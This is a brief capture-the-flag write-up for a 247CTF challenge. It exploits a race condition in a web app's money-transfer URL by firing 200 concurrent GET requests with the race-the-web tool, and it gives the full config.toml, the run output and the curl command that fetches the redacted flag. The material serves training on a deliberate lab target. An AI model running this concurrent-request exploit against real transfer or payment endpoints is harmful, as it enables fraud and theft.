exploit race condition

2 type request send in multi thread,
it's will make occure the race condition

I used super useful and strong tool,,

https://github.com/TheHackerDev/race-the-web

this tool is are so nice and fast

```
->$ race-the-web config.toml
```
this tool requre the config.toml in argument:

request type1: ?to=1&from=2&amount=50.
request type2: ?to=2&from=1&amount=50.

config.toml
```
# Specify the first request
[[requests]]
    # Use the GET request method
    method = "GET"
    # Set the URL target. Any valid URL is accepted, including ports, https, and parameters.
    url = "https://e634a9e3f05457b9.247ctf.com/?to=2&from=1&amount=50"
    # Set the request body.
    # body = "body=text"
    # Set the cookie values to send with the request to this target. Must be an array.
    #cookies = ["",""]
    # Set custom headers to send with the request to this target. Must be an array.
    #headers = ["X-Originating-IP: 127.0.0.1", "X-Remote-IP: 127.0.0.1"]
    # Follow redirects
    #redirects = true

# Specify the second request
[[requests]]
    # Use the POST request method
    method = "GET"
    # Set the URL target. Any valid URL is accepted, including ports, https, and parameters.
    url = "https://e634a9e3f05457b9.247ctf.com/?to=1&from=2&amount=50"
    # Set the request body.
    #body = "val=1000"
    # Set the cookie values to send with the request to this target. Must be an array.
    #cookies = ["",""]
    # Set custom headers to send with the request to this target. Must be an array.
    #headers = ["X-Originating-IP: 127.0.0.1", "X-Remote-IP: 127.0.0.1"]
    # Do not follow redirects
    #redirects = false

```

run 
```
->$ race-the-web config.toml 
Requests begin.
[VERBOSE] Sending 200 GET requests to https://e634a9e3f05457b9.247ctf.com/?to=1&from=2&amount=50
[VERBOSE] Sending 200 GET requests to https://e634a9e3f05457b9.247ctf.com/?to=2&from=1&amount=50
```

finish

```
->$ curl https://e634a9e3f05457b9.247ctf.com/?flag\&from=2
247CTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```
